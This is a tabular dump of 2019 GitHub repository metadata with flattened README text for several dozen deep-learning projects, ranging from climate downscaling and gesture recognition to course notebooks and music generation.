SantanderMetGroup,DeepDownscaling,n/a,DOI https zenodo org badge 207791959 svg https zenodo org badge latestdoi 207791959 DeepDownscaling Deep learning approaches for statistical downscaling in climate Transparency and reproducibility are key ingredients to develop top quality science For this reason this repository is aimed at hosting and maintaining updated versions of the code needed to partly or fully reproduce the results presented in the Santander Met Group http www meteo unican es en view publications papers dealing with the application of deep learning techniques for statistical dowscaling in climate We lean for many tasks on climate4R https github com SantanderMetGroup climate4R a bundle of R packages developed by the Santander Met Group for transparent climate data access post processing including bias correction and downscaling visualization and model validation A battery of Jupyter notebooks with worked examples explaining how to use the main functionalities of the core climate4R packages including downscaleR https github com SantanderMetGroup downscaleR for standard statistical downscaling methods can be found here https github com SantanderMetGroup notebooks For deep learning impplementations we use keras https cran r project org web packages keras index html an R library which provides an interface to Keras https keras io a high level neural networks API which supports arbitrary network architectures and is seamlessly integrated with TensorFlow https www tensorflow org The table below lists the documents Jupyter notebooks scripts etc contained in this respository along with the information of the corresponding published or submitted papers Notebook files Article Title Journal Zenodo DOI 2019deepDownscalingGMD pdf Rmd Configuration and Intercomparison of Deep Learning Neural Models for Statistical Downscaling Geoscientific Model Development 10 5281 zenodo 3462428 https zenodo org record 3462428,2019-09-11T11:07:41Z,2019-11-21T10:15:19Z,Jupyter Notebook,SantanderMetGroup,Organization,10,1,0,72,master,jorgebanomedina#rmanzanas#gutierjm,3,4,4,0,0,0,0
ksangeeta2429,deep_radar,n/a,deepradar Deep learning with radar data regression,2019-08-21T17:02:22Z,2019-12-06T19:35:27Z,Jupyter Notebook,ksangeeta2429,User,2,1,1,13,master,ksangeeta2429#dhruboroy29,2,0,0,0,0,0,0
kkole3897,Deep_Learning_From_Scratch1,n/a,1 DeepLearningFromScratch1 CUAI 1 310 10 00 15 00 Main Reviewer CHAPTER freethrow CHAPTER RNN CHAPTER freethrow 1 2 3 4 5 6 7 CNN 8 1 1 1 1 chap 01 https nbviewer jupyter org github kkole3897 DeepLearningFromScratch1 blob master chap1 ipynb chap 02 https nbviewer jupyter org github kkole3897 DeepLearningFromScratch1 blob master Chapter2 ipynb chap 03 https nbviewer jupyter org github kkole3897 DeepLearningFromScratch1 blob master Chapter3 ipynb chap 04 https nbviewer jupyter org github kkole3897 DeepLearningFromScratch1 blob master Chapter4 ipynb chap 05 https nbviewer jupyter org github kkole3897 DeepLearningFromScratch1 blob master Chapter5 ipynb chap 06 https nbviewer jupyter org github kkole3897 DeepLearningFromScratch1 blob master Chapter6 ipynb,2019-09-06T04:26:55Z,2019-10-05T00:13:10Z,Jupyter Notebook,kkole3897,User,3,1,0,79,master,kkole3897#statslove#alopui#Jin0316#leeje008,5,0,0,0,0,0,0
sojiadeshina,deep-learning-gluon-new-york,n/a,Usage git clone https github com sad deep learning gluon new york deep learning gluon new york content for workshop on deep learning mxnet gluon and gluon toolkits Tentative Schedule Gluon Fundamentals NDArray Autograd https github com sad deep learning gluon new york blob master 01 gluon fundamentals ndarray autograd ipynb Blocks and HybridBlocks https github com sad deep learning gluon new york blob master 01 gluon fundamentals nn block hybrid ipynb Training Loop https github com sad deep learning gluon new york blob master 01 gluon fundamentals train ipynb Gluon CV https gluon cv mxnet io Computer vision toolkit Demo https github com sad deep learning gluon new york blob master 02 gluon cv gluoncv demo ipynb Gluon NLP https gluon nlp mxnet io Natural language processing toolkit Demo https github com sad deep learning gluon new york blob master 03 gluon nlp gluonnlp demo ipynb Gluon TS https gluon ts mxnet io Probabilistic time Series toolkit Demo https github com sad deep learning gluon new york blob master 04 gluon ts gluonts demo ipynb,2019-09-14T20:05:00Z,2019-09-24T20:23:53Z,Jupyter Notebook,sojiadeshina,User,1,1,2,11,master,sojiadeshina,1,0,0,0,0,0,0
bdeepak255,Deep-Learning-Classifier-for-NLP,n/a,Deep Learning Classifier for NLP Recursive Neural Network Classifier that would identify a given statement as pro technology Technology Determinism or anti technology Technology Skepticism Pro Technology statements generally would show faith and support for technology in solving many problems while the Anti statements would show doubt and skepticism about using technology,2019-08-18T18:11:52Z,2019-08-18T18:37:21Z,Python,bdeepak255,User,1,1,0,2,master,bdeepak255,1,0,0,0,0,0,0
EsterHlav,Advanced-Visualization-Methods-Deep-Learning,cnn#computer-vision#deep-learning#explainability#lstm#natural-language-processing#neural-networks#rnn#visualization#visualization-networks,Advanced Visualization Methods in Deep Learning An overview of visualization techniques used for computer vision CNNs and natural language processing RNNs as well as generic feature representation methods for explainability 1 CNN Visualization Computer Vision images Sanity Checks for Saliency Maps https papers nips cc paper 8160 sanity checks for saliency maps pdf 2 RNN Visualization Natural Language Processing text LSTMVis A Tool for Visual Analysis of Hidden State Dynamics in Recurrent Neural Networks https arxiv org pdf 1606 07461 pdf 3 Explainability features A Unified Approach to Interpreting Model Predictions http papers nips cc paper 7062 a unified approach to interpreting model predictions pdf,2019-09-08T21:29:47Z,2019-10-23T00:08:13Z,n/a,EsterHlav,User,1,1,0,2,master,EsterHlav,1,0,0,0,0,0,0
ketencimert,Deep_Learning-Google_Street_View,n/a,DeepLearning GoogleStreetView Multi digit Number Recognition from Street View Imagery Paper Review and Implementation ECBM4040 Multi digit Number Recognition from Street View Imagery using Deep Convolutional Neural Network Team Aijia Gao Mert Ketenci Shimeng Feng There are five jupyter notebook files within this zip folder 1 LoadImageTrain ipynb preprocess training images and conver to pickle file 2 LoadImageTest ipynb preprocess test images and conver to pickle file 3 ModelSVHN ipynb Build model perform training and testing 4 100 Class Classification implementation of alternative model beyond original paper 5 RegressionClassifier implementation of alternative model beyond original paper Description of each file LoadImageTrain This jupyter notebook is used to read and process each image from the training dataset downloaded from the source website The dataset from the source website contains images with variable size Within each image there are blue bounding box created to circle out the individual digit within the street number The coordinates of those bounding box are provided in digitStruct mat file First we read the individual png image and store the full pixel values Following the same preprocessing steps outlined in the paper we then find the blue box enclosing all the digits of the street number and enlarge it by 30 on all direction Finally we crop the image to the size of the blue box and resize all images to 54 by 54 The last task performed in this notebook is to output the pixle values of the resized images to a pickle file This way we can save time by loading data directly from this pickle file instead of reading directly from png images LoadImageTest This jupyter notebook performs the same tasks as the LoadImageTrain file It reads and process each image from the test dataset downloaded from the source website ModelSVHN This is the main file that perform the following tasks 1 Read image data from processed pickle file and perform image preprocessing 2 Build full model and define the functions for prediction and accuracy evaluation 3 Initaite tensorflow session to train the model with train set and perform cross validation 4 Load the trained model and perform tesing using test set Detailed description of each tasks are included in the jupyter notebook In the last two files 100 Class Classification and RegressionClassifier we implemented to two alternative model to approach the problem of multi digit sequence recognition The structure of the notebook is similar to ModelSVHN There are two data files that are needed to run the last three model files if users do not want to extract image from the original PNG files 1 trainpkl gz pickle file storing pixle values and labels of training images to be used in training 2 testpkl gz pickle file storing pixle values and labels of training images to be used in testing We uploaded the pickle files of data on bitbucket Therefore users can directly load image data from pickle file and run the ModelSVHN ipynb If users want to test the LoadImageTrain and LoadImageTest the train tar gz and test tar gz need to be downloaded from the source website Format 1 http ufldl stanford edu housenumbers Then the zip files need to be extracted and saved in the same directory The jupyter notebook will then read each png image and generate pickle files,2019-08-28T14:40:07Z,2019-11-18T00:02:35Z,Jupyter Notebook,ketencimert,User,1,1,0,7,master,ketencimert,1,0,0,0,0,0,0
SuHuynh,Image-Enhancement-using-Deep-Learning,n/a,Image Enhancement using Deep Learning Convert RGB image HSI then enhace image convert back HSI RGB This repository is implemented by Caffe on SVHN dataset Model Model https github com SuHuynh Image Enhancement using Deep Learning blob master imgs model PNG Results results on RGB color space https github com SuHuynh Image Enhancement using Deep Learning blob master imgs RGBimages PNG results on HSI color space https github com SuHuynh Image Enhancement using Deep Learning blob master imgs HSIimages PNG,2019-08-27T04:55:04Z,2019-08-27T09:44:28Z,C++,SuHuynh,User,1,1,0,13,master,SuHuynh,1,0,0,0,0,0,0
yeonsikC,Deep-Learning-with-Keras-Founders,n/a,Deep Learning with Keras Founders 2 2 1 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 2 1 a first look at a neural network ipynb 3 3 4 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 3 4 classifying movie reviews ipynb 3 5 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 3 5 classifying newswires ipynb 3 6 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 3 6 predicting house prices ipynb 4 4 4 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 4 4 overfitting and underfitting ipynb 5 5 1 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 5 1 introduction to convnets ipynb 5 2 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 5 2 using convnets with small datasets ipynb 5 3 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 5 3 using a pretrained convnet ipynb 5 4 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 5 4 visualizing what convnets learn ipynb 6 6 1 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 6 1 one hot encoding of words or characters ipynb 6 1 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 6 1 using word embeddings ipynb 6 2 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 6 2 understanding recurrent neural networks ipynb 6 3 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 6 3 advanced usage of recurrent neural networks ipynb 6 4 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 6 4 sequence processing with convnets ipynb 8 8 1 LSTM http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 8 1 text generation with lstm ipynb 8 2 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 8 2 deep dream ipynb 8 3 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 8 3 neural style transfer ipynb 8 4 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 8 4 generating images with vaes ipynb 8 5 http nbviewer jupyter org github rickiepark deep learning with python notebooks blob master 8 5 introduction to gans ipynb,2019-09-17T05:50:13Z,2019-09-27T09:01:31Z,Jupyter Notebook,yeonsikC,User,1,1,0,10,master,yeonsikC,1,0,0,0,0,0,0
abhranil-datascience,ImageAnalyticsDeepLearningPOC,n/a,Day2 Resnet50FromScratch Resnet is a special architecture of CNN that is proven to perform good Main problem of basic CNN is that usually a developer does not know how many layers to stack and whatshould be the hyperparameters Hence professionals use architectures that have proven to work in the past and resnet is one among them A resnet can have 18 34 50 101 152 layers alt text https github com abhranil datascience Day2 Resnet50FromScratch blob master ResnetChart png,2019-09-13T14:35:51Z,2019-11-27T04:26:22Z,n/a,abhranil-datascience,User,1,1,0,17,ImageAnalytics,abhranil-datascience,1,0,0,0,0,0,0
udayzee05,Human-Activity-recognistion--Deep-learning,n/a,,2019-08-20T06:04:42Z,2019-12-05T11:44:18Z,Jupyter Notebook,udayzee05,User,1,1,0,1,master,udayzee05,1,0,0,0,0,0,0
rurumimic,Neural-Networks-and-Deep-Learning,andrew-ng#coursera#deep-learning#deeplearning-ai#neural-networks,Neural Networks and Deep Learning Andrew Ng deeplearning ai Coursera About this Course If you want to break into cutting edge AI this course will help you do so Deep learning engineers are highly sought after and mastering deep learning will give you numerous new career opportunities Deep learning is also a new superpower that will let you build AI systems that just weren t possible a few years ago In this course you will learn the foundations of deep learning When you finish this class you will Understand the major technology trends driving Deep Learning Be able to build train and apply fully connected deep neural networks Know how to implement efficient vectorized neural networks Understand the key parameters in a neural network s architecture This course also teaches you how Deep Learning actually works rather than presenting only a cursory or surface level description So after completing it you will be able to apply deep learning to a your own applications If you are looking for a job in AI after this course you will also be able to answer basic interview questions This is the first course of the Deep Learning Specialization Instructor Andrew Ng CEO Founder Landing AI Co founder Coursera Adjunct Professor Stanford University formerly Chief Scientist Baidu and founding lead of Google Brain Head Teaching Assistant Kian Katanforoosh Lecturer of Computer Science at Stanford University deeplearning ai Ecole CentraleSupelec Teaching Assistant Younes Bensouda Mourri Mathematical Computational Sciences Stanford University deeplearning ai Certificate Coursera Certificate https www coursera org account accomplishments certificate QXMCUZ3RY8QY certificate png,2019-08-17T10:48:39Z,2019-08-18T11:00:32Z,Jupyter Notebook,rurumimic,User,1,1,0,4,master,rurumimic,1,0,0,0,0,0,0
salujarohit,Deep-Learning-for-Medical-Images,n/a,Deep Learning for Medical Images Rohit Saluja salujarohit Mohamed Ahmed Khalifa21,2019-09-03T15:35:56Z,2019-10-25T15:10:47Z,Jupyter Notebook,salujarohit,User,3,1,0,160,master,Khalifa21#salujarohit,2,0,0,0,0,0,0
luanarbarros,Deep-Learning-for-Texture-Analyses,n/a,Deep Learning for Texture Analysis cv tricks Code based from this repo Detailed in this TensorFlow tutorial,2019-09-04T02:03:07Z,2019-11-17T00:26:20Z,Python,luanarbarros,User,3,1,0,33,master,luanarbarros#gutierrezps,2,0,0,0,0,0,0
humblefool15,deep-learning-based-parking-system-,n/a,deep learning based parking system Smart Parking System Maintaining empty parking spot count using real time vehicle detection Due to occlusions coming due to the presence of mirror in the middle of camera and parking lot which slightly reflects nearby people passing through low resolution of video and positioning of cars at different angles in the parking lot and limitations of yolo it cannot detect every car in all the frames and hence the count fluctuates yolooutput gif Same is the case with Mask RCNN But for a different video with high resolution and less occlusions the case becomes different Note that in the video below the moving car comes in front of the parked on for few seconds and thus YOLO couldn t detect the occluded car and the count changed Other than that it worked fine for the resolution the video had aa gif The problem can be broken into two parts detecting the parking slot location and detection occupancy within the slots We can manually mark the areas of the parking lots but this is a cumbersome process which has to be repeated each time we change the camra position A better approach will be identify the slots from the security cam footage itself Subesquently each of the identified slots can call a classifier to detect the presence absence of a car aaaa gif,2019-08-09T11:20:29Z,2019-08-12T18:06:24Z,Python,humblefool15,User,1,1,0,6,master,humblefool15,1,0,0,0,0,0,0
guillaumephd,deep_learning_hand_gesture_recognition,n/a,Deep Learning for Hand Gesture Recognition This repository holds a pytorch implementation of the deep learning model for hand gesture recognition introduced in the article Deep Learning for Hand Gesture Recognition on Skeletal Data https ieeexplore ieee org document 8373818 from G Devineau F Moutarde W Xi and J Yang Getting started A complete notebook is provided here Notebook for Deep Learning for Hand Gesture Recognition deeplearninghandgesturemodelquickstart ipynb The notebook includes gesture data loading model creation and model training For convenience the same notebook is also available as an interactive Google Colab https colab research google com drive 1TcfF3sNBOAXkQC5XU7tHMBfm0FYIC0UR Overview of the gesture recognition approach with a CNN deep leaning model images pipeline png Additional details are provided below Model overview Summary A deep learning model i e a neural network middle is used to classify hand gestures The neural network uses a sparse representation of the hand left The neural network extracts motion features using a dedicated temporal feature extractor right made of temporal convolutions These temporal features are finally used to determine the nature of the gesture performed Model input Studies on human visual perception of biological motion Johansson 1973 https link springer com article 10 3758 BF03212378 have shown that humans can recognize human body motion actions using the motion of the body s skeletal joints positions only as you can see on this youtube video https www youtube com watch v rEVB6kW9p6k Such skeletal pose representations are lightweight and very sparse compared to image and video representations Some sensors directly provide streams of body skeletons or hand skeletons e g Leap Motion Kinect camera RealSense camera or motion capture suits and gloves It is also possible to extract the pose information from videos using vision based approaches like OpenPose https github com CMU Perceptual Computing Lab openpose AlphaPose https github com MVIG SJTU AlphaPose or Googles https github com google mediapipe Media Pipe https ai googleblog com 2019 08 on device real time hand tracking with html at a good frame rate Each hand joint typically has 2 or 3 dimensions to represent its x y or x y z position in space at a given timestep A gesture is thus represented by a sequence over time of njoints e g 22 joints in the image above joints or equivalently by a sequence over time of nchannels e g 66 channels 22 joints x 3 channels for x y and z position of the joint The model use such sequences as input Finding temporal features The key idea of the model is to extract relevant features to classify the gesture based on the temporal evolution of each channel signal The extracted features will later be used to perform the classification Each channel is processed separately For performance the temporal feature extraction processing is split into three parallel branches that are later merged Lets describe the first one left To extract temporal features for each individual 1D channel e g lets say the channel representing the y position of the wrist the neural network uses 1D convolutions over time The network use 3 convolutional and pooling layers to get a better representation In order to deal with different time resolutions this processing branch is actually present twice left and right in the temporal feature extraction module but with different sizes time resolutions for the convolution kernel A third pooling only branch middle is added in order to help the backpropagation during the training Finally for each channel the outputs computed by the three branches are concatenated into a single output Gesture classification Once features have been extracted for each channel they need to be merged To that extent they are all fed into a dense neural network one hidden layer which performs the final classification The full model by channel temporal feature extraction final MLP is differentiable and can be trained end to end Training the model with your own gestures Recognizing hand gestures can be useful in many daily real life situations writing drawing typing communicating with sign language cooking gardening driving playing music playing sport painting acting doing precise surgery pointing interacting with ones environment in augmented reality or virtual reality for drone control lights control sound control home automation medicine nonverbal communication the list is almost limitless A Get hand pose sequences If you only have videos of the gestures first use a vision based approach to generate hand pose skeletal representation of your sequences For instance you can use the CMU s OpenPose demo https github com CMU Perceptual Computing Lab openpose or Google s MediaPipe https github com google mediapipe blob master mediapipe docs handtrackingmobilegpu md You can also use motion capture gloves or dedicated sensors Leap Motion RealSense camera that directly provide such sequences If you don t have any hand gesture available or if you want to reproduce the results of the research article you can also download the DHG 14 28 Dataset http www rech telecom lille fr DHGdataset or the SHREC17 Track Dataset http www rech telecom lille fr shrec2017 hand To preprocess the two datasets and load them with a single line of code please follow the instructions provided here https github com guillaumephd deeplearninghandgesturerecognition issues 1 B Data format The model expects gestures to be tensors of the following shape batchsize duration nchannels For instance if you want to recognize a batch of 32 gestures of length 100 on a hand skeletal constituted of 22 joints in 3D x y z i e 22x3 66 channels the shape of the tensor should be 32 100 66 C Load the gesture sequences data First change the loaddata and the functions just below it to load your own data section 2 of the notebook Then load it section 4 of the notebook D Train the model Specify how many gesture classes you have and how many hand channels not joints you have section 4 of the notebook You can now train the model on your own model E Training tips 1 You should always visualize the metrics loss accuracy both for train test validation of the model during the training You can use tensorboard for that see notebook for more details 1 If the validation error starts increasing you ve likely already been overfitting for a few epochs 2 If you encounter some pytorch error ensure that your labels are in the correct range of values and that the gesture tensor shape is correct 3 If the accuracy curves are too noisy or not smooth enough consider decreasing the optimizer s learning rate 4 You can use data augmentation to improve the model performance Requirements The notebook will run fine with python 3 pytorch 1 0 and above Usual pip modules numpy sklearn scipy Optional if you want to monitor the neural networks metrics during training youll also need tensorboardX and tensorboard the latter is provided by tensorflow Citation If you find this code useful in your research please consider citing inproceedingsdevineau2018deep title Deep learning for hand gesture recognition on skeletal data author Devineau Guillaume and Moutarde Fabien and Xi Wang and Yang Jie booktitle 2018 13th IEEE International Conference on Automatic Face Gesture Recognition FG 2018 pages 106 113 year 2018 organization IEEE,2019-09-05T14:35:20Z,2019-12-02T14:35:59Z,Jupyter Notebook,guillaumephd,User,1,1,1,5,master,guillaumephd#guillaumedevineauminesparis,2,0,0,0,1,0,0
iamdeepakr,iisc-workshop-on-deep-learning,n/a,,2019-09-02T05:50:35Z,2019-09-02T05:56:26Z,n/a,iamdeepakr,User,1,1,0,2,master,iamdeepakr,1,0,0,0,0,0,0
sethhardik,music_piano_using_deep_learning,deep-learning#deep-neural-networks#jupyter-notebook#lstm-neural-networks#machine-learning#music-generation#music21#piano-keyboard#python3#recurrent-neural-networks,musicpianodeeplearning the project can be used to generate piano tune the music train model file it contains all the code required to train the keras model the music generation file it contains all the code required to get the output weights file added are not working quite well as my computer is not working properly model trained only for 3 epochs and then interrupted causing error in music train model ipynb try to train your own model to get good outputs dependencies used 1 keras 2 numpy 3 music21 4 pickle 5 glob to get output run music generation ipynb layers used 1 LSTM 2 dropout 3 dense type of modeling sequential,2019-08-16T21:25:19Z,2019-08-17T01:24:09Z,Jupyter Notebook,sethhardik,User,1,1,0,5,master,sethhardik,1,0,0,0,0,0,0
haozhe-an,Automated-Deep-Learning-ICDM-2019,n/a,Automated Deep Learning ICDM 2019 Web page for Automated Deep Learning Theory Algorithms Platforms and Applications by Baidu Research at ICDM 2019 Available at http baiduautodl com,2019-09-02T10:30:20Z,2019-09-09T05:11:16Z,HTML,haozhe-an,User,1,1,0,32,master,haozhe-an,1,0,0,0,0,0,0
muhammadfraz,Udacity_Deep_Learning_Nano_Degree,n/a,,2019-09-12T09:22:16Z,2019-09-12T13:54:04Z,HTML,muhammadfraz,User,1,1,0,0,master,,0,0,0,0,0,0,0
1jainsomya,Targeted-customer-using-Deep-Learning,n/a,Targeted customer using Deep Learning Machine learning algorithm based on a company s data that can predict if a customer will buy again from the audiobook company Applied K fold cross validation with Randomized search CV which minimizes the effort of the company by targeting only those customers who are likely to convert again,2019-08-21T13:10:13Z,2019-08-30T15:41:21Z,Python,1jainsomya,User,1,1,0,5,master,1jainsomya,1,0,0,0,0,0,0
satwik2663,Deep-Learning-Rap-Lyrics-genrator,n/a,Deep Learning Rap Lyrics genrator This model demonstrates the efficiency of a Long Short Term Memory Language model along with the baseline model to generate unconstrained rap lyrics This model aims at creating similar in style yet unique lyrics Additionally the model defines the line length of the lyrics by comparing the last word with the most rhymed word The experiments show that automatically generated lyrics can correctly capture the patterns and styles of multiple lyricist and fit into certain scenarios As evaluation method can be used to analyze system performance we propose methods like Cosine similarity Rhyme Density and bilingual evaluation understudy We provide a corpus of lyrics for 11 rap artists with 11 540 unique words and 20 007 lines of lyrics We also suggest further work for understanding and improving this process and generating more novel lyrics Concepts used Markov Chain Long short term memory License This project is licensed under the MIT License see the LICENSE md file for details,2019-08-11T16:59:30Z,2019-12-11T12:12:59Z,Jupyter Notebook,satwik2663,User,1,1,0,39,master,satwik2663#NidhSharma,2,0,0,0,0,0,2
wenyaxinluoyang,neural-networks-and-deep-learning,n/a,,2019-09-05T07:51:11Z,2019-09-06T09:10:35Z,Python,wenyaxinluoyang,User,1,1,0,4,master,wenyaxinluoyang,1,0,0,0,0,0,0
Reljod,Deep-Learning-with-Python-Tutorial,n/a,Deep Learning with Python Tutorial The Notebook code comes from the Deep Learning with Python Tutorial book Example of Overfitting Training and Evaluation Loss https github com Reljod Deep Learning with Python Tutorial blob master images loss png Training and Evaluation Accuracy https github com Reljod Deep Learning with Python Tutorial blob master images accuracy png The notebooks are in this series 1 Keras Hello World using MNIST dataset https github com Reljod Deep Learning with Python Tutorial blob master DeepLearningWithPythonMNIST ipynb 2 Introduction to Neural Network IMDB dataset binary classification with Keras https github com Reljod Deep Learning with Python Tutorial blob master DeepLearningWithPythonChapter3 IMDB ipynb 3 Introduction to Neural Network Reuter dataset multilabel classification with Keras https github com Reljod Deep Learning with Python Tutorial blob master DeepLearingWithPythonChapter35 NewsWire ipynb 4 Introduction to Neural Network Boston Housing dataset Regression with Keras https github com Reljod Deep Learning with Python Tutorial blob master DeepLearningWithPythonChapter36 BostonHousing ipynb 5 Dealing with Overfitting by Tuning Layer sizes MNIST dataset multilabel classficiation with Keras https github com Reljod Deep Learning with Python Tutorial blob master DeepLearningWithPythonMNIST ipynb 6 Dealing with Overfitting by Regularizers MNIST dataset multilabel classficiation with Keras https github com Reljod Deep Learning with Python Tutorial blob master DeepLearningWithPythonRegularization ipynb 7 Dealing with Overfitting by Dropout Boston Housing dataset Regression with Keras https github com Reljod Deep Learning with Python Tutorial blob master DeepLearningWithPythonDropout ipynb 8 Introduction to Convolutional Neural Networks Cat vs Dogs dataset binary classification with Keras https github com Reljod Deep Learning with Python Tutorial blob master DeepLearningWithPythonConvNetCatvsDog ipynb 9 Visualizing Convolutional Neural Networks Cat vs Dogs dataset using VGG16 Model with Keras https github com Reljod Deep Learning with Python Tutorial blob master DeepLearningWithPythonVisualizingConvNet ipynb VGG16 model Visualization of Filters Activations Final Convolution Layer Author Reljod T Oreta https github com Reljod,2019-08-20T13:39:58Z,2019-08-22T05:53:13Z,Jupyter Notebook,Reljod,User,1,1,0,19,master,Reljod,1,0,0,0,0,0,0
ZhanXix,study-deeplearning.ai,n/a,study deeplearning ai,2019-08-16T09:44:29Z,2019-10-22T10:23:25Z,Jupyter Notebook,ZhanXix,User,1,1,0,15,master,ZhanXix,1,0,0,0,0,0,0
Emitive,WasteSegregation,n/a,WasteSegregation WasteSegregation By Deep Learning KMITL King Mongkut s Institute of Technology Ladkrabang Years 2019 Types of Plastic Bottle 1 Clear Bottle PET or PETE Water bottle Soft Drink Tea ETC PVC Hair Spray Wide neck bottle 2 Semi transparent HDPE Milk Distilled water 3 Opaque Colored Plastic Shampoo Liquid Soap Dish washer Written By Jukkapong Arya 59010185 Pathorn Jaewtrakul 59011059,2019-09-17T08:38:15Z,2019-11-15T05:21:51Z,Python,Emitive,User,1,1,0,27,master,bbasjkp#Emitive,2,0,0,0,0,0,0
madisi98,DL_utils,n/a,DLutils Deep Learning utils for Keras over Tensorflow Supported models Fully Connected NN FCNN 2D Convolutional NN CNN2D Generative Adeversarial Networks GAN Any internal structure Utils,2019-09-14T21:49:09Z,2019-11-07T11:06:05Z,Python,madisi98,User,1,1,0,14,master,madisi98,1,0,0,0,0,0,0
zolastro,Evo,n/a,,2019-09-09T17:07:01Z,2019-10-15T17:32:41Z,Python,zolastro,User,1,1,0,4,master,zolastro,1,0,0,0,0,0,0
tzclk,AI-Workbook,n/a,,2019-08-25T15:06:10Z,2019-08-25T19:09:33Z,n/a,tzclk,User,1,1,0,2,master,tzclk,1,0,0,2,0,2,1
vimesh-shah,financial-intermediary-funds-funding-decisions,n/a,financial intermediary funds funding decisions Deep learning practice program,2019-08-25T14:24:57Z,2019-11-07T01:07:24Z,Jupyter Notebook,vimesh-shah,User,1,1,0,3,master,vimesh-shah,1,0,0,0,0,0,0
sonu6084,ML-model,n/a,ML model Containing Machine learning and deep learning models,2019-09-15T06:44:26Z,2019-09-15T06:45:43Z,Jupyter Notebook,sonu6084,User,1,1,0,2,master,sonu6084,1,0,0,0,0,0,0
avinashbarnwal,survival_analysisML,n/a,Survival Analysis Machine Learning and Deep Learning,2019-08-13T19:19:03Z,2019-08-15T03:03:57Z,Jupyter Notebook,avinashbarnwal,User,1,1,1,3,master,avinashbarnwal,1,0,0,0,0,0,0
junlei007,MachineLearningStudy,n/a,numpy,2019-09-05T09:09:23Z,2019-09-29T08:30:03Z,Python,junlei007,User,1,1,0,30,master,junlei007,1,0,0,0,0,0,11
adtmv7,DeepSlice,n/a,5G DeepSlice A Deep Learning Approach towards an Efficient and Reliable Network Slicing in 5G Networks This is the accepted version of the work The final version will be published in IEEE UEMCON 2019 For citation please use A Thantharate R A Paropkari C Beard and V Walunj DeepSlice A Deep Learning Approach towards an Efficient and Reliable Network Slicing in 5G Networks 2019 IEEE 10th Annual Ubiquitous Computing Electronics Mobile Communication Conference UEMCON New York NY USA 2019 in press,2019-09-15T22:40:03Z,2019-11-04T00:53:00Z,Python,adtmv7,User,2,1,2,6,master,adtmv7#vijaybw,2,0,0,0,0,0,0
stykes,dist-deep,n/a,dist deep Parallelized and distributed deep learning framework,2019-09-18T19:27:35Z,2019-12-06T18:14:49Z,C,stykes,User,1,1,0,17,master,stykes,1,0,0,0,1,0,0
wangjianshou,deepVirScan,n/a,deepVirScan This project provides a deep learning method to detect virus reads from metagenomic data Denendencies python3 6 pandas numpy tensorflow 2 0 0 Usage This version is only used to test whether the convolutional neural network is feasible for seeking virus reads in metagenomics But if you want to use this model to predict virus reads then the usage is below If the current directory is deepVirScan then the command line is python m model runv2 example example train data If you want to get the source model to keep training with your own data here s the code import tensorflow as tf from src dataprocessing import generatepredict from src deepVirScan import minimodel VirScan model VirScan optimizer tf optimizers Adam ckpt tf train Checkpoint model model optimizer optimizer latest tf train latestcheckpoint model deepVirScan ckpt ckpt restore latest Version 2 0,2019-09-16T06:55:22Z,2019-11-05T08:08:59Z,Python,wangjianshou,User,1,1,0,20,master,wangjianshou,1,0,0,0,0,0,2
snig0708,LSTM_deep_learning_project_on_airlines_data,n/a,LSTMdeeplearningprojectonairlinesdata Predicting one step predictions using deep learning network LSTMs on airlines data acvailable on Kaggle website,2019-08-19T14:36:48Z,2019-08-19T15:58:06Z,n/a,snig0708,User,1,1,0,2,master,snig0708,1,0,0,0,0,0,0
vipul2001,cousera-courses,n/a,Coursera Courses These are the solution of various assigments of coursera courses done by me,2019-08-24T17:26:58Z,2019-10-10T17:56:29Z,Jupyter Notebook,vipul2001,User,1,1,0,24,master,vipul2001,1,0,0,0,0,0,0
MaciejBlaszczyk,Tuning-deep-learning-parameters-for-classification-problems,n/a,Tuning deep learning parameters for classification problems The aim of this project is to test various types of deep neural networks with different hyperparameters in task of classification Tested networks MLP CNN Capsule network LSTM network Utilized 8 datasets from PMLB collection Used techniques grid search 5 fold cross validation NNs were also compared with XGBoost to check if ML algorithms are competitive with NNs Auxiliary research problems How many neurons in hidden layer for MLP How many hidden layers for MLP Tech stack Python 3 Keras Tensorflow Numpy Pandas Matplotlib Seaborn,2019-08-27T13:30:39Z,2019-09-02T12:10:38Z,Python,MaciejBlaszczyk,User,1,1,0,2,master,MaciejBlaszczyk,1,0,0,0,0,0,0
AhMedAfzalKhan,Sign-Language-Prediction-using-Deep-Learning,n/a,Sign Language Prediction using Deep Learning Sign Language Prediction system for communicating with deaf and dumb people Instructions for executing and understanding the Sign language prediction system 1 Image Paths needs to be set for each different folder for different gestures if the images need to be captured 2 New folder Path should be set for saving the preprocessed images in that folder 3 For Training and testing purpose set the path of the preprocessed data 4 For using the pre trained CNN model for prediction set the path for the h5 file in the last cell code 5 Pre trained model which is stored in CNNmodel h5 file can be used for prediction or the same dataset can be found on kaggle https www kaggle com ahmedkhanak1995 sign language gesture images dataset 6 The Gesture Images folder consists of the images of the gestures which are included in the dataset There are total 37 hand sign gestures 7 The Gesture preprocessed Images folder consists of the images of the gestures in the preprocessed dataset 8 Demo mp4 is a video showing the final prediction results 9 finalcode ipynb file is a jupyter notebook python file which includes the entire code from capturing of the dataset to the CNN model training and prediction using OpenCV 10 For successful execution of this code one should follow the 1 5 instructions,2019-09-10T20:03:18Z,2019-09-11T11:24:38Z,Jupyter Notebook,AhMedAfzalKhan,User,1,1,0,9,master,AhMedAfzalKhan,1,0,0,0,0,0,0
